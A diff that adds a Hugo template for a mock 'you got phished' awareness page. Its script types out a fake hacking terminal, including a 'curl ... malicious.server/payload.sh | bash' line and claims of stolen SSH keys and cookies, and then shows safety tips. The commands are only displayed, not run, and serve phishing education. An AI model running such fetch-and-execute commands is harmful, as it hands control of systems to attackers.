@@ -1,0 +1,121 @@
+mkdir -p layouts/report-phishing
+cat > layouts/report-phishing/list.html << 'EOF'
+{{ define "main" }}
+<div id="hack-screen" style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace;">
+
+  <!-- Terminal Window -->
+  <div id="terminal" style="width:90%;max-width:700px;background:#0d1117;border:1px solid #00ff88;border-radius:10px;padding:30px;box-shadow:0 0 40px rgba(0,255,136,0.3);">
+    <div style="display:flex;gap:8px;margin-bottom:20px;">
+      <span style="width:12px;height:12px;border-radius:50%;background:#ff5f57;display:inline-block;"></span>
+      <span style="width:12px;height:12px;border-radius:50%;background:#febc2e;display:inline-block;"></span>
+      <span style="width:12px;height:12px;border-radius:50%;background:#28c840;display:inline-block;"></span>
+      <span style="color:#666;font-size:0.8rem;margin-left:8px;">bash — 80x24</span>
+    </div>
+    <div id="output" style="color:#00ff88;font-size:0.9rem;line-height:1.8;min-height:300px;"></div>
+  </div>
+
+  <!-- Education Modal (hidden initially) -->
+  <div id="edu-modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:99999;justify-content:center;align-items:center;">
+    <div style="max-width:650px;width:90%;background:#0d1117;border:2px solid #ff5f57;border-radius:16px;padding:40px;text-align:center;">
+      <div style="font-size:4rem;margin-bottom:20px;">⚠️</div>
+      <h1 style="color:#ff5f57;font-family:monospace;font-size:1.8rem;margin-bottom:16px;">YOU JUST GOT PHISHED!</h1>
+      <p style="color:#aaa;font-size:0.95rem;line-height:1.8;margin-bottom:20px;">
+        If this were a real attack, your device would now be <span style="color:#ff5f57;">compromised</span>.<br>
+        You clicked a link without verifying where it leads.
+      </p>
+
+      <div style="background:#1a1a2e;border-radius:10px;padding:20px;margin-bottom:24px;text-align:left;">
+        <h3 style="color:#00ff88;font-family:monospace;margin-bottom:14px;">🛡️ How to stay safe:</h3>
+        <ul style="color:#ccc;font-size:0.88rem;line-height:2;padding-left:20px;">
+          <li>Always <strong style="color:#fff;">hover over links</strong> before clicking to see the real URL</li>
+          <li>Check that the domain is <strong style="color:#fff;">exactly right</strong> — attackers use lookalike domains</li>
+          <li>Legitimate companies <strong style="color:#fff;">never ask for passwords</strong> via email or links</li>
+          <li>Look for <strong style="color:#fff;">HTTPS</strong> but know it alone doesn't mean the site is safe</li>
+          <li>When in doubt — <strong style="color:#fff;">don't click</strong>. Go directly to the official website</li>
+          <li>Report suspicious emails to your <strong style="color:#fff;">IT/security team</strong> immediately</li>
+        </ul>
+      </div>
+
+      <div style="background:#1a1a2e;border-radius:10px;padding:16px;margin-bottom:24px;text-align:left;">
+        <h3 style="color:#667eea;font-family:monospace;margin-bottom:10px;">📊 Real Phishing Stats:</h3>
+        <p style="color:#aaa;font-size:0.85rem;line-height:1.8;margin:0;">
+          • <strong style="color:#fff;">3.4 billion</strong> phishing emails are sent every day<br>
+          • <strong style="color:#fff;">36%</strong> of all data breaches involve phishing<br>
+          • The average phishing attack costs a company <strong style="color:#fff;">$4.9 million</strong><br>
+          • <strong style="color:#fff;">97%</strong> of users cannot identify a sophisticated phishing email
+        </p>
+      </div>
+
+      <p style="color:#555;font-size:0.8rem;margin-bottom:20px;">
+        ⚡ This was a <strong style="color:#00ff88;">controlled educational simulation</strong> by Wh1t3 5hvd0w.<br>
+        No data was collected. No harm was done. Stay safe out there.
+      </p>
+
+      <a href="{{ .Site.BaseURL }}" style="display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border-radius:8px;text-decoration:none;font-family:monospace;font-size:0.9rem;">← Back to Safety</a>
+    </div>
+  </div>
+
+</div>
+
+<script>
+const output = document.getElementById('output');
+const modal = document.getElementById('edu-modal');
+
+const steps = [
+  { text: '$ whoami', delay: 0 },
+  { text: 'visitor', delay: 600 },
+  { text: '', delay: 800 },
+  { text: '$ nmap -sV ' + window.location.hostname, delay: 1000 },
+  { text: 'Starting Nmap scan...', delay: 1800 },
+  { text: 'Host is up (0.0023s latency)', delay: 2400 },
+  { text: 'PORT     STATE SERVICE VERSION', delay: 2800 },
+  { text: '80/tcp   open  http    nginx 1.18.0', delay: 3200 },
+  { text: '443/tcp  open  https   OpenSSL 3.0.2', delay: 3600 },
+  { text: '', delay: 4000 },
+  { text: '$ curl -s http://malicious.server/payload.sh | bash', delay: 4200 },
+  { text: 'Connecting to malicious.server...', delay: 5000, color: '#febc2e' },
+  { text: '[████████████████████] 100% payload.sh downloaded', delay: 5800, color: '#febc2e' },
+  { text: '', delay: 6200 },
+  { text: '$ chmod +x payload.sh && ./payload.sh', delay: 6400 },
+  { text: '[*] Initializing...', delay: 7200, color: '#ff5f57' },
+  { text: '[*] Scanning filesystem...', delay: 7800, color: '#ff5f57' },
+  { text: '[*] Locating sensitive files...', delay: 8400, color: '#ff5f57' },
+  { text: '[+] Found: /home/visitor/Documents/passwords.txt', delay: 9000, color: '#ff5f57' },
+  { text: '[+] Found: /home/visitor/.ssh/id_rsa', delay: 9400, color: '#ff5f57' },
+  { text: '[+] Found: browser cookies & saved passwords', delay: 9800, color: '#ff5f57' },
+  { text: '[*] Exfiltrating data to remote server...', delay: 10400, color: '#ff5f57' },
+  { text: '[████████████████████] 100% Complete', delay: 11200, color: '#ff5f57' },
+  { text: '', delay: 11600 },
+  { text: '[!] SYSTEM COMPROMISED', delay: 12000, color: '#ff0000' },
+  { text: '[!] All your data has been exfiltrated', delay: 12500, color: '#ff0000' },
+  { text: '[!] Establishing persistent backdoor...', delay: 13000, color: '#ff0000' },
+  { text: '[!] You have been PWNED 💀', delay: 13600, color: '#ff0000' },
+];
+
+let i = 0;
+function typeStep() {
+  if (i >= steps.length) {
+    setTimeout(() => {
+      modal.style.display = 'flex';
+    }, 1500);
+    return;
+  }
+  const step = steps[i];
+  setTimeout(() => {
+    const line = document.createElement('div');
+    line.textContent = step.text;
+    line.style.color = step.color || '#00ff88';
+    if (step.color === '#ff0000') {
+      line.style.fontWeight = 'bold';
+      line.style.fontSize = '1rem';
+    }
+    output.appendChild(line);
+    output.scrollTop = output.scrollHeight;
+    i++;
+    typeStep();
+  }, i === 0 ? 500 : steps[i].delay - steps[i-1].delay);
+}
+
+typeStep();
+</script>
+{{ end }}
